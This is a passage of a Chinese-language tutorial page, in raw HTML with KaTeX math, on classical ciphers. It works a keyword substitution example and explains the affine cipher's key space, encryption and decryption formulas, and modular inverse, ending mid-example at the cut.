例题</h4><p>给定密钥为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>a</mi><mi>c</mi><mi>u</mi><mi>l</mi><mi>a</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">spectacular</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></p><p>明文：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>B</mi><mi>C</mi><mi>D</mi><mi>E</mi><mi>F</mi><mi>G</mi><mi>H</mi><mi>I</mi><mi>J</mi><mi>K</mi><mi>L</mi><mi>M</mi><mi>N</mi><mi>O</mi><mi>P</mi><mi>Q</mi><mi>R</mi><mi>S</mi><mi>T</mi><mi>U</mi><mi>V</mi><mi>W</mi><mi>X</mi><mi>Y</mi><mi>Z</mi></mrow><annotation encoding="application/x-tex">ABCDEFGHIJKLMNOPQRSTUVWXYZ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">Q</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></p><p>密文：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>a</mi><mi>u</mi><mi>l</mi><mi>r</mi><mi>b</mi><mi>d</mi><mi>f</mi><mi>g</mi><mi>h</mi><mi>i</mi><mi>j</mi><mi>k</mi><mi>m</mi><mi>n</mi><mi>o</mi><mi>q</mi><mi>v</mi><mi>w</mi><mi>x</mi><mi>y</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">spectaulrbdfghijkmnoqvwxyz</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">b</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">m</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></p><p>如果明文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>h</mi><mi>i</mi><mi>n</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">China</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span></span></span></span>，则对应密文为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>l</mi><mi>r</mi><mi>h</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">elrhs</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">h</span><span class="mord mathnormal">s</span></span></span></span></p><h3 id="仿射密码"><a class="markdownIt-Anchor" href="#仿射密码"></a> 仿射密码</h3><p>仿射密码是加强版的移位密码。移位密码的密钥空间只有26，但是仿射密码的密钥空间有312.虽然比移位密码更强大，但数据量仍然不大，在现代计算机面前通过爆破破解明文轻而易举。同时，没有隐藏</p><p>仿射密码是一种线性变换。仿射密码的明文空间和密文空间与移位密码相同，但密钥空间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub><mo separator="true">,</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><mn>26</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">K=\{(k_1,k_2)|k_1,k_2\in Z_{26},gcd(k_1,26)=1 \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>。即需要两个密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">k_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">k_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">k_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>必须和26互素。否则会出现多个明文字母对应同一密文字母的情况。</p><p>对任意的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>c</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">p\in P,c\in C,k=(k_1,k_2)\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>，</p><p>定义加密变换为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msub><mi>E</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=E_k(p)=k_1p+k_2(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></p><p>相应的解密变换为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>c</mi><mo>−</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=D_k(c)=k^{-1}(c-k_2)(\bmod 26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub><msubsup><mi>k</mi><mn>1</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mo>=</mo><mn>1</mn><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k_1k_1^{-1}=1(\bmod26)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.120547em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.433692em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>k</mi><mn>1</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup></mrow><annotation encoding="application/x-tex">k_1^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.120547em;vertical-align:-0.266308em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.433692em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span></span></span></span>为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">k_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的逆元。</p><h4 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h4><p>设明文消息为China，密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>7</mn><mo 